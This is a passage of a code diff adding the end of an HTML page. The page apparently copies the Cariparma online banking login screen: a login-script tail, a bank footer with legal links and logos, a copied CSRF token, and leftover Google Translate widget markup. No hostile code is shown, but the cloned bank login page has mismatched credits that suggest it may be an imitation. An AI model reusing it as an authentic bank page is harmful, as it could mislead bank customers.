+      document.getElementById("fldData").style.visibility = pwdReadonly
+        ? "visible"
+        : "hidden";
+
+      if (mostratoAID) {
+        document.loginForm.operatore.focus();
+      } else {
+        document.loginForm.AID.focus();
+      }
+
+      //controlla il tasto return
+      trapEnterKey("loginForm", "doClick");
+
+      post_deviceprint();
+
+      // -->
+    </script>
+
+    <div align="center">
+      <table class="subFooterContainer" cellspacing="0" cellpadding="0">
+        <tbody>
+          <tr class="delimitatoreFooter" valign="bottom">
+            <td align="left">
+              <table
+                style="padding-bottom: 5px"
+                cellspacing="0"
+                cellpadding="0"
+              >
+                <tbody>
+                  <tr>
+                    <td class="testoFooter">
+                      <a
+                        style="color: #222222"
+                        target="Cariparma"
+                        href="http://www.cariparma.it/jsp/it/notelegali/index.jsp"
+                        ><font style="vertical-align: inherit"
+                          ><font style="vertical-align: inherit"
+                            >Disclaimer</font
+                          ></font
+                        ></a
+                      ><font style="vertical-align: inherit"
+                        ><font style="vertical-align: inherit"> | </font></font
+                      ><a
+                        style="color: #222222"
+                        target="Cariparma"
+                        href="http://www.cariparma.it/jsp/it/nbdetail/sec_npnet2_pag_bnsistema.jsp"
+                        ><font style="vertical-align: inherit"
+                          ><font style="vertical-align: inherit"
+                            >Configurazione richiesta</font
+                          ></font
+                        ></a
+                      >
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </td>
+            <td align="right">
+              <table>
+                <tbody>
+                  <tr>
+                    <td align="right">
+                      <a
+                        target="Cariparma"
+                        href="http://www.credit-agricole.fr/"
+                        ><img alt src="/NET2/azimg/logo_CA.jpg"
+                      /></a>
+                    </td>
+                    <td align="right">
+                      <a target="Cariparma" href="http://www.acbi.it/"
+                        ><img alt src="/NET2/azimg/logo_CBI.gif"
+                      /></a>
+                    </td>
+                    <td align="right">
+                      <a
+                        target="Cariparma"
+                        href="https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=BANKLINKNET2.CARIPARMA.IT&amp;lang=it"
+                        ><img alt src="/NET2/azimg/logo_Verisign.gif"
+                      /></a>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td class="testoPiccolissimoFooter" align="left">
+              <fontCopyright style="vertical-align: inherit"
+                ><font style="vertical-align: inherit"
+                  >2011. Sito ottimizzato per una risoluzione di 800x600
+                  con Microsoft IE 6.0</font
+                ></fontCopyright 
+              >
+            </td>
+            <td class="testoPiccolissimoFooter" align="right">
+              <font style="vertical-align: inherit"
+                ><font style="vertical-align: inherit"
+                  >CCIAA Parme REA 212837 | </font
+                ><font style="vertical-align: inherit"
+                  >Compte TVA 02113530345</font
+                ></font
+              >
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div id="subFooter" class="subFooterContainer" align="center">
+      <table width='100%"' cellpadding="0" cellspacing="0" border="0">
+        <tbody>
+          <tr>
+            <td
+              class="testoTenueFooter"
+              width="100%"
+              valign="middle"
+              align="center"
+            >
+              &nbsp;
+            </td>
+          </tr>
+
+          <tr>
+            <td
+              class="testoTenueFooter"
+              width="100%"
+              valign="middle"
+              align="center"
+            >
+              <cite
+                ><font style="vertical-align: inherit"
+                  ><font style="vertical-align: inherit"
+                    >1997 - 2022 STB</font
+                  ></font
+                ></cite
+              >
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+      <form name="POPHELP" target="Help" action="/NET2/Help" method="POST">
+        <input
+          type="hidden"
+          name="OWASP_CSRFTOKEN"
+          value="37UC-O3T3-XJEH-OFWW-JI96-VFM8-3BGL-4A0B"
+        />
+        <input type="hidden" name="pagina" value />
+        <input type="hidden" name="punto" value />
+      </form>
+    </div>
+    <div
+      id="goog-gt-tt"
+      class="VIpgJd-yAWNEb-L7lbkb skiptranslate"
+      style="
+        border-radius: 12px;
+        margin: 0 0 0 -23px;
+        padding: 0;
+        font-family: 'Google Sans', Arial, sans-serif;
+      "
+      data-id
+    >
+      <div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd">
+        <div class="VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c">
+          <img
+            src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg"
+            width="24"
+            height="24"
+            alt
+          />
+        </div>
+        <div class="VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c">
+          <div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">
+            Texte d'origine
+          </div>
+          <div
+            id="goog-gt-original-text"
+            class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"
+          ></div>
+        </div>
+        <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr">
+          <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr">
+            <div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">
+              Évaluez cette traduction
+            </div>
+            <div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">
+              Votre avis nous aidera à améliorer Google&nbsp;Traduction
+            </div>
+          </div>
+          <div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr">
+            <button
+              id="goog-gt-thumbUpButton"
+              type="button"
+              class="VIpgJd-yAWNEb-hvhgNd-bgm6sf"
+              title="Bonne traduction"
+              aria-label="Bonne traduction"
+              aria-pressed="false"
+            >
+              <span id="goog-gt-thumbUpIcon"
+                ><svg
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  focusable="false"
+                  class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"
+                >
+                  <path
+                    d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"
+                  ></path></svg></span
+              ><span id="goog-gt-thumbUpIconFilled"
+                ><svg
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  focusable="false"
+                  class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"
+                >
+                  <path
+                    d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"
+                  ></path></svg
+              ></span></button
+            ><button
+              id="goog-gt-thumbDownButton"
+              type="button"
+              class="VIpgJd-yAWNEb-hvhgNd-bgm6sf"
+              title="Mauvaise traduction"
+              aria-label="Mauvaise traduction"
+              aria-pressed="false"
+            >
+              <span id="goog-gt-thumbDownIcon"
+                ><svg
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  focusable="false"
+                  class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"
+                >
+                  <path
+                    d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"
+                  ></path></svg></span
+              ><span id="goog-gt-thumbDownIconFilled"
+                ><svg
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  focusable="false"
+                  class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"
+                >
+                  <path
+                    d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"
+                  ></path></svg
+              ></span>
+            </button>
+          </div>
+        </div>
+        <div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce">
+          <form
+            id="goog-gt-votingForm"
+            action="//translate.googleapis.com/translate_voting?client=te_lib"
+            method="post"
+            target="votingFrame"
+            class="VIpgJd-yAWNEb-hvhgNd-aXYTce"
+          >
+            <input
+              type="text"
+              name="sl"
+              id="goog-gt-votingInputSrcLang"
+            /><input
+              type="text"
+              name="tl"
+              id="goog-gt-votingInputTrgLang"
+            /><input
+              type="text"
+              name="query"
+              id="goog-gt-votingInputSrcText"
+            /><input
+              type="text"
+              name="gtrans"
+              id="goog-gt-votingInputTrgText"
+            /><input type="text" name="vote" id="goog-gt-votingInputVote" />
+          </form>
+          <iframe name="votingFrame" frameborder="0"></iframe>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
